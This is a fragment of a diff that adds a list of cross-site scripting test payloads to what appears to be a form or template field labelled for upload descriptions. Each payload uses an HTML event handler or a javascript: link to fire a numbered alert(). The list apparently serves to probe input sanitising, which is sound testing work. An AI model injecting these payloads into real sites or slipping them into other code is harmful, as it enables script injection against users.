+      <body onload=alert("upload_description_13")>
+
+      <video><source onerror=alert("upload_description_14")>
+
+      <audio src=x onerror=alert("upload_description_15")>
+
+      <marquee onstart=alert("upload_description_16")>
+
+      <meter onmouseover=alert("upload_description_17")>0</meter>
+
+      <details open ontoggle=alert("upload_description_18")>
+
+      <input onfocus=alert("upload_description_19") autofocus>
+
+      <select onfocus=alert("upload_description_20") autofocus><option>x</option></select>
+
+      <textarea onfocus=alert("upload_description_21") autofocus>
+
+      <keygen onfocus=alert("upload_description_22") autofocus>
+
+      <math><mi xlink:href="javascript:alert(''upload_description_23'')">click</mi></math>
+
+      <xmp><img src=x onerror=alert("upload_description_24")></xmp>
+
+      <noscript><img src=x onerror=alert("upload_description_25")></noscript>
+
+      <listing>&lt;img src=x onerror=alert("upload_description_26")&gt;</listing>'
+  validations:
+    required: false
